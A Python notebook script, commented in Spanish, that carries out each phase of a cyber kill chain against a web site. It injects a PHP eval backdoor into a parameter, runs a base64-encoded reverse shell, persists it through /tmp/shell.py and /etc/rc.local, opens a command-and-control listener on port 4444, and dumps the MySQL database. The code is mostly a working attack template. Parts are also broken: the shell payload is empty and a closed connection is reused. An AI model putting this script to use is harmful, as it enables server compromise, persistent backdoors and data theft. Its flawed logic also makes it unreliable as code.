# %%
# Importamos las librerías necesarias
import requests # para hacer peticiones HTTP
import socket # para crear sockets
import subprocess # para ejecutar comandos del sistema
import os # para interactuar con el sistema operativo
import base64 # para codificar y decodificar datos

# Fase 1: Reconocimiento
# El atacante busca información sobre el objetivo, en este caso una página web
objetivo = "https://www.ejemplo.com" # la dirección de la página web
respuesta = requests.get(objetivo) # hacemos una petición GET a la página web
if respuesta.status_code == 200: # si la respuesta es exitosa
    print("La página web está activa") # imprimimos un mensaje
    cabeceras = respuesta.headers # obtenemos las cabeceras de la respuesta
    print("Las cabeceras de la página web son:") # imprimimos un mensaje
    for cabecera, valor in cabeceras.items(): # iteramos por cada cabecera y su valor
        print(cabecera + ": " + valor) # imprimimos la cabecera y su valor
    servidor = cabeceras["Server"] # obtenemos el valor de la cabecera Server
    if "Apache" in servidor: # si el servidor es Apache
        print("El servidor es Apache") # imprimimos un mensaje
        puerto = 80 # asignamos el puerto 80
    elif "nginx" in servidor: # si el servidor es nginx
        print("El servidor es nginx") # imprimimos un mensaje
        puerto = 443 # asignamos el puerto 443
    else: # si el servidor es otro
        print("El servidor es desconocido") # imprimimos un mensaje
        puerto = 0 # asignamos el puerto 0
else: # si la respuesta no es exitosa
    print("La página web no está activa") # imprimimos un mensaje
    exit() # salimos del programa

# Fase 2: Armamento o preparación
# El atacante crea o selecciona el malware o la herramienta que va a utilizar para explotar el objetivo
# En este caso, vamos a usar una shell inversa, que es un código que permite al atacante obtener una consola remota del objetivo
# La shell inversa se codifica en base64 para evitar la detección de los antivirus
shell_inversa = "" # el código de la shell inversa codificado en base64
shell_inversa = base64.b64decode(shell_inversa) # decodificamos el código de la shell inversa
shell_inversa = shell_inversa.decode("utf-8") # convertimos el código de la shell inversa a una cadena de texto

# Fase 3: Distribución o entrega
# El atacante envía o entrega el malware o la herramienta al objetivo, por ejemplo, mediante un correo electrónico, una descarga, un USB, etc.
# En este caso, vamos a usar una vulnerabilidad de inyección de código en la página web, que permite ejecutar código arbitrario en el servidor
# Suponemos que la página web tiene un parámetro llamado "nombre" que es vulnerable a la inyección de código
parametro = "nombre" # el nombre del parámetro vulnerable
inyeccion = "<?php eval($_GET['cmd']); ?>" # el código que vamos a inyectar en el parámetro, que ejecuta el comando que le pasemos por otro parámetro llamado "cmd"
payload = objetivo + "?" + parametro + "=" + inyeccion # el payload o carga útil que vamos a enviar a la página web
respuesta = requests.get(payload) # hacemos una petición GET con el payload
if respuesta.status_code == 200: # si la respuesta es exitosa
    print("La inyección de código ha funcionado") # imprimimos un mensaje
else: # si la respuesta no es exitosa
    print("La inyección de código no ha funcionado") # imprimimos un mensaje
    exit() # salimos del programa

# Fase 4: Explotación
# El atacante ejecuta el malware o la herramienta en el objetivo, aprovechando una vulnerabilidad o engañando al usuario
# En este caso, vamos a ejecutar la shell inversa en el servidor, usando el parámetro "cmd" que hemos creado con la inyección de código
comando = "python -c '" + shell_inversa + "'" # el comando que vamos a ejecutar en el servidor, que es el código de la shell inversa en python
payload = objetivo + "?" + parametro + "=" + inyeccion + "&cmd=" + comando # el payload o carga útil que vamos a enviar a la página web
respuesta = requests.get(payload) # hacemos una petición GET con el payload
if respuesta.status_code == 200: # si la respuesta es exitosa
    print("La shell inversa se ha ejecutado") # imprimimos un mensaje
else: # si la respuesta no es exitosa
    print("La shell inversa no se ha ejecutado") # imprimimos un mensaje
    exit() # salimos del programa

# Fase 5: Instalación
# El atacante instala una puerta trasera o un acceso persistente en el objetivo, para poder controlarlo de forma remota
# En este caso, vamos a crear un archivo en el servidor con el código de la shell inversa, y lo vamos a hacer ejecutable
archivo = "/tmp/shell.py" # el nombre del archivo que vamos a crear en el servidor
comando = "echo '" + shell_inversa + "' > " + archivo # el comando que vamos a ejecutar en el servidor, que escribe el código de la shell inversa en el archivo
payload = objetivo + "?" + parametro + "=" + inyeccion + "&cmd=" + comando # el payload o carga útil que vamos a enviar a la página web
respuesta = requests.get(payload) # hacemos una petición GET con el payload
if respuesta.status_code == 200: # si la respuesta es exitosa
    print("El archivo se ha creado") # imprimimos un mensaje
    comando = "chmod +x " + archivo # el comando que vamos a ejecutar en el servidor, que hace el archivo ejecutable
    payload = objetivo + "?" + parametro + "=" + inyeccion + "&cmd=" + comando # el payload o carga útil que vamos a enviar a la página web
    respuesta = requests.get(payload) # hacemos una petición GET con el payload
    # Fase 5: Instalación (continuación)
# El atacante hace que el archivo se ejecute en el inicio del sistema
comando = "echo '" + archivo + "' >> /etc/rc.local" # el comando que vamos a ejecutar en el servidor, que agrega el nombre del archivo al final del archivo /etc/rc.local
payload = objetivo + "?" + parametro + "=" + inyeccion + "&cmd=" + comando # el payload o carga útil que vamos a enviar a la página web
respuesta = requests.get(payload) # hacemos una petición GET con el payload
if respuesta.status_code == 200: # si la respuesta es exitosa
    print("El archivo se ejecutará en el inicio del sistema") # imprimimos un mensaje
else: # si la respuesta no es exitosa
    print("El archivo no se ejecutará en el inicio del sistema") # imprimimos un mensaje
    exit() # salimos del programa

# Fase 6: Comando y control
# El atacante se comunica con el objetivo a través de un canal encubierto, para enviarle órdenes o recibir datos
# En este caso, vamos a usar un socket TCP para establecer una conexión entre el atacante y el objetivo
ip = "192.168.1.1" # la dirección IP del atacante
puerto = 4444 # el puerto que va a usar el atacante
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creamos un socket TCP
s.bind((ip, puerto)) # asociamos el socket a la dirección IP y el puerto del atacante
s.listen(1) # ponemos el socket en modo escucha, esperando una conexión entrante
print("Esperando la conexión del objetivo...") # imprimimos un mensaje
conn, addr = s.accept() # aceptamos la conexión del objetivo
print("Conexión establecida con el objetivo:", addr) # imprimimos un mensaje con la dirección IP y el puerto del objetivo
while True: # entramos en un bucle infinito
    comando = input(">> ") # pedimos al usuario que introduzca un comando
    if comando == "exit": # si el comando es "exit"
        break # salimos del bucle
    conn.send(comando.encode()) # enviamos el comando al objetivo codificado en bytes
    respuesta = conn.recv(1024) # recibimos la respuesta del objetivo en bytes
    print(respuesta.decode()) # imprimimos la respuesta decodificada en texto
conn.close() # cerramos la conexión con el objetivo
s.close() # cerramos el socket

# Fase 7: Acciones
# El atacante realiza las acciones que persigue con el ataque, como robar información, dañar el sistema, extorsionar al usuario, etc.
# En este caso, vamos a suponer que el atacante quiere robar los datos de la base de datos de la página web
comando = "mysqldump -u root -p database > dump.sql" # el comando que vamos a ejecutar en el objetivo, que hace una copia de la base de datos llamada "database" en un archivo llamado "dump.sql"
conn.send(comando.encode()) # enviamos el comando al objetivo codificado en bytes
respuesta = conn.recv(1024) # recibimos la respuesta del objetivo en bytes
print(respuesta.decode()) # imprimimos la respuesta decodificada en texto
comando = "cat dump.sql" # el comando que vamos a ejecutar en el objetivo, que muestra el contenido del archivo "dump.sql"
conn.send(comando.encode()) # enviamos el comando al objetivo codificado en bytes
respuesta = conn.recv(1024) # recibimos la respuesta del objetivo en bytes
print(respuesta.decode()) # imprimimos la respuesta decodificada en texto
# Aquí el atacante puede ver los datos de la base de datos y guardarlos o enviarlos a otro lugar
